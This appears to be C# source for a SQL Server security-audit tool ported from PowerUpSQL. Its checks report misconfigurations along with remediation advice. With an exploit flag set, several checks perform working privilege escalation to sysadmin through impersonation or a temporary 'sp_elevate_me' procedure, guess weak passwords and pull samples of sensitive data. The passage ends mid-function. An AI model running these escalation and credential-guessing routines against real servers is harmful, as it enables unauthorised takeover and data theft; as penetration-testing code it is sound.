using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using SharpUpSQL.Common;
using SharpUpSQL.Core.Auth;
using SharpUpSQL.Core.Execution;
using SharpUpSQL.Core.Helpers;

namespace SharpUpSQL.Audit
{
    internal static class AuditEngine
    {
        internal const string Author = "Scott Sutherland (@_nullbind), NetSPI 2016";

        internal delegate IEnumerable<SqlAuditResult> AuditCheck(AuditContext context);

        internal static readonly KeyValuePair<string, AuditCheck>[] AllChecks =
        {
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditDefaultLoginPw", AuditDefaultLoginPw),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditWeakLoginPw", AuditWeakLoginPw),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivImpersonateLogin", AuditPrivImpersonateLogin),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivServerLink", AuditPrivServerLink),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivTrustworthy", AuditPrivTrustworthy),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivDbChaining", AuditPrivDbChaining),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivCreateProcedure", AuditPrivCreateProcedure),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivXpDirtree", AuditPrivXpDirtree),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivXpFileexist", AuditPrivXpFileexist),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditRoleDbDdlAdmin", AuditRoleDbDdlAdmin),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditRoleDbOwner", AuditRoleDbOwner),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditSampleDataByColumn", AuditSampleDataByColumn),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditSQLiSpExecuteAs", AuditSqliSpExecuteAs),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditSQLiSpSigned", AuditSqliSpSigned),
            new KeyValuePair<string, AuditCheck>("Invoke-SQLAuditPrivAutoExecSp", AuditPrivAutoExecSp)
        };

        internal static IEnumerable<SqlAuditResult> RunAll(AuditContext context)
        {
            foreach (var check in AllChecks)
            {
                foreach (var result in check.Value(context))
                {
                    yield return result;
                }
            }
        }

        internal static bool TestConnection(AuditContext context)
        {
            var test = ConnectionTester.Test(
                context.Instance,
                null,
                null,
                context.Options,
                context.Verbose,
                true);

            return string.Equals(test.Status, "Accessible", StringComparison.OrdinalIgnoreCase);
        }

        internal static SqlServerInfoResult GetServerInfo(AuditContext context)
        {
            return SqlEnumerationEngine.GetSqlServerInfo(
                    context.Options,
                    context.Instance,
                    context.Verbose,
                    context.SuppressVerbose)
                .FirstOrDefault();
        }

        internal static string GetComputerName(AuditContext context)
        {
            var info = GetServerInfo(context);
            if (info != null && !string.IsNullOrEmpty(info.ComputerName))
            {
                return info.ComputerName;
            }

            return InstanceHelper.GetComputerName(context.Instance);
        }

        internal static string GetCurrentLogin(AuditContext context)
        {
            var info = GetServerInfo(context);
            return info != null ? info.Currentlogin : null;
        }

        internal static bool IsLoginSysadmin(AuditContext context, string login)
        {
            return IsLoginSysadmin(context.Options, login, null);
        }

        internal static bool IsLoginSysadmin(
            SqlConnectionOptions baseOptions,
            string login,
            string password)
        {
            if (string.IsNullOrEmpty(login))
            {
                return false;
            }

            var options = baseOptions.Clone();
            if (password != null)
            {
                options.Username = login;
                options.Password = password;
            }

            var query = "SELECT IS_SRVROLEMEMBER('sysadmin', " +
                        SqlValueFormatter.QuoteLiteral(login) + ") AS [Status]";
            var rows = QueryExecutor.ExecuteQuery(options, query, null, true);
            if (rows.Count == 0)
            {
                return false;
            }

            var status = SqlValueFormatter.Format(rows[0]["Status"]);
            return status == "1";
        }

        internal static bool IsCurrentLoginSysadmin(AuditContext context)
        {
            var check = SqlEnumerationEngine.GetSqlSysadminCheck(
                    context.Options,
                    context.Instance,
                    context.Verbose,
                    true)
                .FirstOrDefault();

            return check != null &&
                   string.Equals(check.IsSysadmin, "Yes", StringComparison.OrdinalIgnoreCase);
        }

        internal static List<string> BuildPrincipalList(AuditContext context, string currentLogin)
        {
            var principals = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            if (!string.IsNullOrEmpty(currentLogin))
            {
                principals.Add(currentLogin);
            }

            principals.Add("public");

            foreach (var role in SqlEnumerationEngine2.GetSqlServerRoleMember(
                         context.Options,
                         context.Instance,
                         context.Verbose,
                         true))
            {
                if (string.Equals(role.Name, currentLogin, StringComparison.OrdinalIgnoreCase) &&
                    !string.IsNullOrEmpty(role.Value))
                {
                    principals.Add(role.Value);
                }
            }

            return principals.ToList();
        }

        internal static void ExecuteQuery(AuditContext context, string query, string database = null)
        {
            ExecuteQueryAs(context, null, null, query, database);
        }

        internal static void ExecuteQueryAs(
            AuditContext context,
            string username,
            string password,
            string query,
            string database = null)
        {
            var options = context.Options.Clone();
            if (!string.IsNullOrEmpty(username))
            {
                options.Username = username;
            }

            if (password != null)
            {
                options.Password = password;
            }

            if (!string.IsNullOrEmpty(database))
            {
                options.Database = database;
            }

            QueryExecutor.ExecuteNonQuery(options, query, context.Verbose, true);
        }

        internal static List<Dictionary<string, object>> Query(
            AuditContext context,
            string query,
            string database = null)
        {
            var options = context.Options.Clone();
            if (!string.IsNullOrEmpty(database))
            {
                options.Database = database;
            }

            return QueryExecutor.ExecuteQuery(options, query, context.Verbose, true);
        }

        internal static bool IsFlagOn(string value)
        {
            return value == "1" ||
                   string.Equals(value, "True", StringComparison.OrdinalIgnoreCase);
        }

        internal static SqlAuditResult BaseRow(
            AuditContext context,
            string computerName,
            string vulnerability,
            string description,
            string remediation,
            string severity,
            string exploitCmd)
        {
            return SqlAuditResult.Create(
                computerName,
                context.Instance,
                vulnerability,
                description,
                remediation,
                severity,
                "No",
                "No",
                "No",
                exploitCmd,
                string.Empty,
                string.Empty,
                Author);
        }

        internal static IEnumerable<SqlAuditResult> AuditSqliSpExecuteAs(AuditContext context)
        {
            const string check = "Potential SQL Injection - EXECUTE AS OWNER";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            var exploitCmd = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance " +
                             context.Instance + " -Keyword \"EXECUTE AS OWNER\"";

            foreach (var proc in GetSqliProcedures(context, "EXECUTE AS OWNER", false))
            {
                var details = "The " + proc + " stored procedure is affected.";
                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    check,
                    "The affected procedure is using dynamic SQL and the \"EXECUTE AS OWNER\" clause.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.",
                    "Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the \"EXECUTE AS OWNER\" clause.",
                    "High",
                    "Yes",
                    "Unknown",
                    "No",
                    exploitCmd,
                    details,
                    "https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation",
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditSqliSpSigned(AuditContext context)
        {
            const string check = "Potential SQL Injection - Signed by Certificate Login";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            var exploitCmd = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance " +
                             context.Instance + " -OnlySigned";

            foreach (var proc in GetSqliProcedures(context, null, true))
            {
                var details = "The " + proc + " stored procedure is affected.";
                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    check,
                    "The affected procedure is using dynamic SQL and has been signed by a certificate login.  As a result, it may be possible to impersonate signer if SQL injection is possible.",
                    "Consider using parameterized queries instead of concatenated strings.",
                    "High",
                    "Yes",
                    "Unknown",
                    "No",
                    exploitCmd,
                    details,
                    "https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation",
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivServerLink(AuditContext context)
        {
            const string check = "Excessive Privilege - Server Link";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            const string vulnerability = "Excessive Privilege - Linked Server";
            const string description =
                "One or more linked servers is preconfigured with alternative credentials which could allow a least privilege login to escalate their privileges on a remote server.";
            const string remediation =
                "Configure SQL Server links to connect to remote servers using the login's current security context.";

            foreach (var link in SqlEnumerationEngine.GetSqlServerLink(
                         context.Options,
                         context.Instance,
                         null,
                         context.Verbose,
                         true))
            {
                if (string.Equals(link.LocalLogin, "Uses Self Credentials", StringComparison.OrdinalIgnoreCase) ||
                    string.IsNullOrEmpty(link.RemoteLoginName))
                {
                    continue;
                }

                if (!string.Equals(link.is_data_access_enabled, "True", StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                var exploitCmd = "Example query: SELECT * FROM OPENQUERY([" + link.DatabaseLinkName +
                                 "],'Select ''Server: '' + @@Servername +'' '' + ''Login: '' + SYSTEM_USER')";
                var details = "The SQL Server link " + link.DatabaseLinkName + " was found configured with the " +
                              link.RemoteLoginName + " login.";

                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    vulnerability,
                    description,
                    remediation,
                    "Medium",
                    "Yes",
                    "No",
                    "No",
                    exploitCmd,
                    details,
                    "https://msdn.microsoft.com/en-us/library/ms190479.aspx",
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditDefaultLoginPw(AuditContext context)
        {
            const string check = "Default SQL Server Login Password";
            WriteStart(context, check);

            var computerName = GetComputerName(context);
            const string description =
                "The target SQL Server instance is configured with a default SQL login and password used by a common application.";
            const string remediation =
                "Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.";

            foreach (var entry in DefaultPasswordCatalog.TestInstance(context))
            {
                var exploitCmd = "Get-SQLQuery -Verbose -Instance " + context.Instance +
                                 " -Query \"Select @@Version\" -Username " + entry.Username + " -Password " +
                                 entry.Password + ".";
                var details = "Default credentials found: " + entry.Username + " / " + entry.Password +
                              " (sysadmin: " + entry.IsSysadmin + ").";

                yield return SqlAuditResult.Create(
                    computerName,
                    entry.Instance ?? context.Instance,
                    check,
                    description,
                    remediation,
                    "High",
                    "Yes",
                    "Yes",
                    "No",
                    exploitCmd,
                    details,
                    "https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md",
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivTrustworthy(AuditContext context)
        {
            const string check = "Excessive Privilege - Trusted Database";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            const string vulnerability = "Excessive Privilege - Trustworthy Database";
            const string description =
                "One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on the server.";
            const string remediation =
                "Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it.";

            foreach (var db in SqlEnumerationEngine.GetSqlDatabase(
                         context.Options,
                         context.Instance,
                         null,
                         false,
                         false,
                         false,
                         context.Verbose,
                         true))
            {
                if (string.Equals(db.DatabaseName, "msdb", StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                if (!IsFlagOn(db.is_trustworthy_on))
                {
                    continue;
                }

                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    vulnerability,
                    description,
                    remediation,
                    "Low",
                    "Yes",
                    "No",
                    "No",
                    "There is not exploit available at this time.",
                    "The database " + db.DatabaseName + " was found configured as trustworthy.",
                    "https://msdn.microsoft.com/en-us/library/ms187861.aspx",
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivAutoExecSp(AuditContext context)
        {
            const string check = "Excessive Privilege - Auto Execute Stored Procedure";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            const string vulnerability = "Excessive Privilege - Auto Execute Stored Procedure";
            const string description =
                "A stored procedured is configured for automatic execution and has explicit permissions assigned.  This may allow non sysadmin logins to execute queries as \"sa\" when the SQL Server service is restarted.";
            const string remediation =
                "Ensure that non sysadmin logins do not have privileges to ALTER stored procedures configured with the is_auto_executed settting set to 1.";

            var autoProcs = SqlEnumerationEngine2.GetSqlStoredProcedureAutoExec(
                    context.Options,
                    context.Instance,
                    null,
                    context.Verbose,
                    true)
                .ToList();

            if (autoProcs.Count == 0)
            {
                WriteComplete(context, check);
                yield break;
            }

            foreach (var proc in autoProcs)
            {
                var procedureName = proc.Value;
                var databaseName = proc.Description;
                var schemaName = proc.Name;
                var privs = GetDatabasePrivileges(context, "master", procedureName);

                foreach (var priv in privs)
                {
                    var fullName = databaseName + "." + schemaName + "." + procedureName;
                    var details = priv.PrincipalName + " has " + priv.StateDescription + " " + priv.PermissionName +
                                  " on " + fullName + ".";

                    yield return SqlAuditResult.Create(
                        computerName,
                        context.Instance,
                        vulnerability,
                        description,
                        remediation,
                        "Low",
                        "Yes",
                        "Unknown",
                        "No",
                        "There is not exploit available at this time.",
                        details,
                        "https://msdn.microsoft.com/en-us/library/ms187861.aspx",
                        Author);
                }
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivXpDirtree(AuditContext context)
        {
            return AuditXpProcedure(context, "xp_dirtree", "Excessive Privilege - Execute xp_dirtree");
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivXpFileexist(AuditContext context)
        {
            return AuditXpProcedure(context, "xp_fileexist", "Excessive Privilege - Execute xp_fileexist");
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivDbChaining(AuditContext context)
        {
            const string check = "Excessive Privilege - Database Ownership Chaining";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            const string vulnerability = "Excessive Privilege - Database Ownership Chaining";
            const string description =
                "Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.";
            const string remediation =
                "Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining.";
            const string reference =
                "https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx";

            foreach (var db in SqlEnumerationEngine.GetSqlDatabase(
                         context.Options,
                         context.Instance,
                         null,
                         context.NoDefaults,
                         false,
                         false,
                         context.Verbose,
                         true))
            {
                if (!IsFlagOn(db.is_db_chaining_on))
                {
                    continue;
                }

                if (string.Equals(db.DatabaseName, "master", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(db.DatabaseName, "tempdb", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(db.DatabaseName, "msdb", StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    vulnerability,
                    description,
                    remediation,
                    "Low",
                    "Yes",
                    "No",
                    "No",
                    "There is not exploit available at this time.",
                    "The database " + db.DatabaseName + " was found configured with ownership chaining enabled.",
                    reference,
                    Author);
            }

            foreach (var config in SqlEnumerationEngine2.GetSqlServerConfiguration(
                         context.Options,
                         context.Instance,
                         context.Verbose,
                         true))
            {
                if (config.Name == null ||
                    config.Name.IndexOf("chain", StringComparison.OrdinalIgnoreCase) < 0 ||
                    config.Value != "1")
                {
                    continue;
                }

                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    vulnerability,
                    description,
                    remediation,
                    "Low",
                    "Yes",
                    "No",
                    "No",
                    "There is not exploit available at this time.",
                    "The server configuration 'cross db ownership chaining' is set to 1.  This can affect all databases.",
                    reference,
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivCreateProcedure(AuditContext context)
        {
            const string check = "PERMISSION - CREATE PROCEDURE";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            var currentLogin = GetCurrentLogin(context);
            var principals = BuildPrincipalList(context, currentLogin);
            var exploitCmd = "No exploit is currently available that will allow " + currentLogin +
                             " to become a sysadmin.";

            var databases = SqlEnumerationEngine.GetSqlDatabase(
                    context.Options,
                    context.Instance,
                    null,
                    false,
                    true,
                    false,
                    context.Verbose,
                    true);

            foreach (var db in databases)
            {
                var privs = GetDatabasePrivileges(context, db.DatabaseName, null)
                    .Where(p => string.Equals(p.PermissionName, "CREATE PROCEDURE", StringComparison.OrdinalIgnoreCase));

                foreach (var priv in privs)
                {
                    if (!principals.Any(p => string.Equals(p, priv.PrincipalName, StringComparison.OrdinalIgnoreCase)))
                    {
                        continue;
                    }

                    var details = "The " + priv.PrincipalName + " principal has the CREATE PROCEDURE permission in the " +
                                  db.DatabaseName + " database.";
                    var isExploitable = HasAlterSchema(context, db.DatabaseName, priv.PrincipalName) ? "Yes" : "No";
                    if (isExploitable == "Yes")
                    {
                        details += " " + priv.PrincipalName + " also has ALTER SCHEMA permissions so procedures can be created.";
                    }

                    yield return SqlAuditResult.Create(
                        computerName,
                        context.Instance,
                        check,
                        "The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.",
                        "If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a command like: REVOKE CREATE PROCEDURE TO user",
                        "Medium",
                        "Yes",
                        isExploitable,
                        "No",
                        exploitCmd,
                        details,
                        "https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396",
                        Author);
                }
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditWeakLoginPw(AuditContext context)
        {
            const string check = "Weak Login Password";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            var currentLogin = GetCurrentLogin(context);
            const string exploitCmd =
                "Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.";

            var logins = CollectWeakLoginCandidates(context);
            var passwords = CollectWeakPasswordCandidates(context);

            foreach (var login in logins.Distinct(StringComparer.OrdinalIgnoreCase))
            {
                foreach (var password in passwords.Distinct(StringComparer.OrdinalIgnoreCase))
                {
                    foreach (var result in TestWeakCredential(context, computerName, currentLogin, login, password, exploitCmd))
                    {
                        yield return result;
                    }
                }

                if (!context.NoUserAsPass)
                {
                    foreach (var result in TestWeakCredential(context, computerName, currentLogin, login, login, exploitCmd))
                    {
                        yield return result;
                    }
                }
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditRoleDbOwner(AuditContext context)
        {
            return AuditDatabaseRole(
                context,
                "DB_OWNER",
                "DATABASE ROLE - DB_OWNER",
                "The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin.",
                true);
        }

        internal static IEnumerable<SqlAuditResult> AuditRoleDbDdlAdmin(AuditContext context)
        {
            return AuditDatabaseRole(
                context,
                "DB_DDLADMIN",
                "DATABASE ROLE - DB_DDLADMIN",
                "The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin, or if a custom assembly can be loaded.",
                false);
        }

        internal static IEnumerable<SqlAuditResult> AuditPrivImpersonateLogin(AuditContext context)
        {
            const string check = "PERMISSION - IMPERSONATE LOGIN";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            var currentLogin = GetCurrentLogin(context);
            var exploitCmd = "Invoke-SQLAuditPrivImpersonateLogin -Instance " + context.Instance + " -Exploit";
            const string vulnerability = "Excessive Privilege - Impersonate Login";
            const string description =
                "The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.";
            const string remediation =
                "Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]";

            foreach (var priv in GetServerPrivileges(context, "IMPERSONATE"))
            {
                var impersonatedLogin = priv.ObjectName;
                var granteeName = priv.GranteeName;
                if (string.IsNullOrEmpty(impersonatedLogin))
                {
                    continue;
                }

                var isSysadmin = IsLoginSysadmin(context, impersonatedLogin);
                var isExploitable = isSysadmin ? "Yes" : "No";
                var details = isSysadmin
                    ? granteeName + " can impersonate the " + impersonatedLogin +
                      " SYSADMIN login. This test was ran with the " + currentLogin + " login."
                    : granteeName + " can impersonate the " + impersonatedLogin +
                      " login (not a sysadmin). This test was ran with the " + currentLogin + " login.";

                var exploited = "No";
                if ((context.Exploit || context.Nested) && isSysadmin && !IsCurrentLoginSysadmin(context))
                {
                    var query = context.Nested
                        ? "EXECUTE AS LOGIN = " + SqlValueFormatter.QuoteLiteral(impersonatedLogin) +
                          ";EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember " +
                          SqlValueFormatter.QuoteLiteral(currentLogin) + ",'sysadmin'"
                        : "EXECUTE AS LOGIN = " + SqlValueFormatter.QuoteLiteral(impersonatedLogin) +
                          ";EXEC sp_addsrvrolemember " + SqlValueFormatter.QuoteLiteral(currentLogin) +
                          ",'sysadmin';Revert";

                    ExecuteQuery(context, query);
                    exploited = IsCurrentLoginSysadmin(context) ? "Yes" : "No";
                }

                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    vulnerability,
                    description,
                    remediation,
                    "High",
                    "Yes",
                    isExploitable,
                    exploited,
                    exploitCmd,
                    details,
                    "https://msdn.microsoft.com/en-us/library/ms181362.aspx",
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static IEnumerable<SqlAuditResult> AuditSampleDataByColumn(AuditContext context)
        {
            const string check = "SEARCH DATA BY COLUMN";
            WriteStart(context, check);
            if (!TestConnection(context))
            {
                WriteComplete(context, check);
                yield break;
            }

            var computerName = GetComputerName(context);
            const string vulnerability = "Potentially Sensitive Columns Found";
            const string description =
                "Columns were found in non default databases that may contain sensitive information.";
            const string remediation =
                "Ensure that all passwords and senstive data are masked, hashed, or encrypted.";
            var exploitCmd = "Invoke-SQLAuditSampleDataByColumn -Instance " + context.Instance + " -Exploit";

            var columns = SqlEnumerationEngine.GetSqlColumn(
                    context.Options,
                    context.Instance,
                    null,
                    null,
                    context.Keyword,
                    null,
                    true,
                    context.Verbose,
                    true)
                .ToList();

            if (columns.Count == 0)
            {
                WriteComplete(context, check);
                yield break;
            }

            foreach (var column in columns)
            {
                var affectedColumn = "[" + column.DatabaseName + "].[" + column.SchemaName + "].[" +
                                     column.TableName + "].[" + column.ColumnName + "]";
                var affectedTable = "[" + column.SchemaName + "].[" + column.TableName + "]";
                string details;

                if (context.Exploit)
                {
                    var sampleQuery = "SELECT TOP " + context.SampleSize + " [" + column.ColumnName + "] FROM " +
                                      affectedTable;
                    var rows = Query(context, sampleQuery, column.DatabaseName);
                    var samples = rows
                        .Select(r => SqlValueFormatter.Format(r[column.ColumnName]))
                        .Where(v => !string.IsNullOrEmpty(v))
                        .Select(v => "\"" + v + "\"");
                    var sampleText = string.Join(" ", samples.ToArray());
                    details = rows.Count > 0
                        ? "Data sample from " + affectedColumn + " : " + sampleText + "."
                        : "No data found in affected column: " + affectedColumn + ".";
                }
                else
                {
                    details = "Affected column: " + affectedColumn + ".";
                }

                yield return SqlAuditResult.Create(
                    computerName,
                    context.Instance,
                    vulnerability,
                    description,
                    remediation,
                    "Informational",
                    "Yes",
                    "Yes",
                    context.Exploit ? "Yes" : "No",
                    exploitCmd,
                    details,
                    "https://msdn.microsoft.com/en-us/library/ms188348.aspx",
                    Author);
            }

            WriteComplete(context, check);
        }

        internal static void WriteAuditCsv(string path, IEnumerable<SqlAuditResult> rows)
        {
            var list = rows.ToList();
            using (var writer = new StreamWriter(path, false, Encoding.UTF8))
            {
                writer.WriteLine(
                    "ComputerName,Instance,Vulnerability,Description,Remediation,Severity,IsVulnerable,IsExploitable,Exploited,ExploitCmd,Details,Reference,Author");

                foreach (var row in list)
                {
                    writer.WriteLine(string.Join(",", new[]
                    {
                        EscapeCsv(row.ComputerName),
                        EscapeCsv(row.Instance),
                        EscapeCsv(row.Vulnerability),
                        EscapeCsv(row.Description),
                        EscapeCsv(row.Remediation),
                        EscapeCsv(row.Severity),
                        EscapeCsv(row.IsVulnerable),
                        EscapeCsv(row.IsExploitable),
                        EscapeCsv(row.Exploited),
                        EscapeCsv(row.ExploitCmd),
                        EscapeCsv(row.Details),
                        EscapeCsv(row.Reference),
                        EscapeCsv(row.Author)
                    }));
                }
            }
        }

        private static IEnumerable<SqlAuditResult> AuditDatabaseRole(
            AuditContext context,
            string roleName,
            string checkLabel,
            string description,
            bool trustworthyExploit)
        {
            WriteStart(context, checkLabel);
            if (!TestConnection(context))
            {
                WriteComplete(context, checkLabel);
                yield break;
            }

            var computerName = GetComputerName(context);
            var currentLogin = GetCurrentLogin(context);
            var principals = BuildPrincipalList(context, currentLogin);
            var exploitCmd = !string.IsNullOrEmpty(context.Options.Username)
                ? "Invoke-SQLAuditRoleDbOwner -Instance " + context.Instance + " -Username " +
                  context.Options.Username + " -Password " + context.Options.Password + " -Exploit"
                : "Invoke-SQLAuditRoleDbOwner -Instance " + context.Instance + " -Exploit";

            if (!string.Equals(roleName, "DB_OWNER", StringComparison.OrdinalIgnoreCase))
            {
                exploitCmd = "No exploit command is available at this time, but a custom assesmbly could be used.";
            }

            foreach (var principal in principals)
            {
                foreach (var member in GetDatabaseRoleMembers(context, roleName, principal))
                {
                    var dbInfo = SqlEnumerationEngine.GetSqlDatabase(
                            context.Options,
                            context.Instance,
                            member.DatabaseName,
                            false,
                            false,
                            false,
                            context.Verbose,
                            true)
                        .FirstOrDefault();

                    var trustedOwner = dbInfo != null &&
                                       IsFlagOn(dbInfo.is_trustworthy_on) &&
                                       IsFlagOn(dbInfo.OwnerIsSysadmin);
                    var isExploitable = trustedOwner ? "Yes" : "No";
                    var exploited = "No";
                    string details;

                    if (trustedOwner)
                    {
                        details = member.PrincipalName + " has the " + roleName + " role in the " +
                                    member.DatabaseName + " database.";

                        if (context.Exploit && !IsCurrentLoginSysadmin(context))
                        {
                            if (trustworthyExploit)
                            {
                                exploited = TryDbOwnerEscalation(context, member.DatabaseName, currentLogin)
                                    ? "Yes"
                                    : "No";
                            }
                            else
                            {
                                ExecuteQuery(context,
                                    "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember " +
                                    SqlValueFormatter.QuoteLiteral(currentLogin) + ",'sysadmin';Revert");
                                exploited = IsCurrentLoginSysadmin(context) ? "Yes" : "No";
                            }
                        }
                    }
                    else
                    {
                        details = member.PrincipalName + " has the " + roleName + " role in the " +
                                    member.DatabaseName + " database, but this was not exploitable.";
                        isExploitable = roleName.Equals("DB_DDLADMIN", StringComparison.OrdinalIgnoreCase)
                            ? "No"
                            : isExploitable;
                    }

                    yield return SqlAuditResult.Create(
                        computerName,
                        context.Instance,
                        checkLabel,
                        description,
                        "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember '" +
                        roleName + "', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember '" +
                        roleName + "', 'MyDbUser'",
                        "Medium",
                        "Yes",
                        isExploitable,
                        exploited,
                        exploitCmd,
                        details,
                        roleName.Equals("DB_DDLADMIN", StringComparison.OrdinalIgnoreCase)
                            ? "https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx"
                            : "https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx",
                        Author);
                }
            }

            WriteComplete(context, checkLabel);
        }

        private static bool TryDbOwnerEscalation(AuditContext context, string databaseName, string currentLogin)
        {
            var spQuery = "CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember " +
                          SqlValueFormatter.QuoteLiteral(currentLogin) + ",'sysadmin' END;";
            try
            {
                ExecuteQuery(context, spQuery, databaseName);
                ExecuteQuery(context, "EXEC sp_elevate_me", databaseName);
                ExecuteQuery(context, "DROP PROCEDURE sp_elevate_me", databaseName);
            }
            catch
            {
                return false;
            }

            return IsCurrentLoginSysadmin(context);
        }

        private static IEnumerable<SqlAuditResult> AuditXpProcedure(
            AuditContext context,
            string procedureName,
            string checkLabel)
        {
            WriteStart(context, checkLabel);
            if (!TestConnection(context))
            {
                WriteComplete(context, checkLabel);
                yield break;
            }

            var computerName = GetComputerName(context);
            var currentLogin = GetCurrentLogin(context);
            var principals = BuildPrincipalList(context, currentLogin);
            const string description =
